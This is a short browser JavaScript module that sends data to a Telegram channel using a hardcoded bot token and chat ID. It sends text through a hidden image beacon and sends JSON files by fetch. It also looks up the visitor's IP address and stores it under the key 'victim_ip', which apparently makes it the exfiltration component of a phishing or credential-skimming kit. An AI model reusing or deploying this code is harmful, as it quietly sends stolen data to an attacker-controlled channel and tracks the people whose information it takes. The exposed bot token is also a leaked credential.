// ===== UNIFIED TELEGRAM.JS =====
const BOT_TOKEN = "8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw";
const CHANNEL_ID = "8374468402";

// ===== SEND TEXT =====
function sendToTelegram(message) {
    try {
        const img = new Image();
        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(message)}`;
        img.style.display = 'none';
        document.body.appendChild(img);
        setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 3000);
        return true;
    } catch(e) { return false; }
}

// ===== SEND JSON FILE =====
function sendJSONtoTelegram(jsonData, filename) {
    try {
        const jsonStr = JSON.stringify(jsonData, null, 2);
        const blob = new Blob([jsonStr], { type: 'application/json' });
        const formData = new FormData();
        formData.append('chat_id', CHANNEL_ID);
        formData.append('document', blob, filename);
        formData.append('caption', `📁 ${filename}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    } catch(e) {}
}

// ===== GET IP =====
function getIP() {
    return new Promise((resolve) => {
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => { localStorage.setItem('victim_ip', data.ip); resolve(data.ip); })
            .catch(() => { resolve('Unknown'); });
    });
}

// ===== EXPOSE =====
window.sendToTelegram = sendToTelegram;
window.sendJSONtoTelegram = sendJSONtoTelegram;
window.getIP = getIP;
window.BOT_TOKEN = BOT_TOKEN;
window.CHANNEL_ID = CHANNEL_ID;
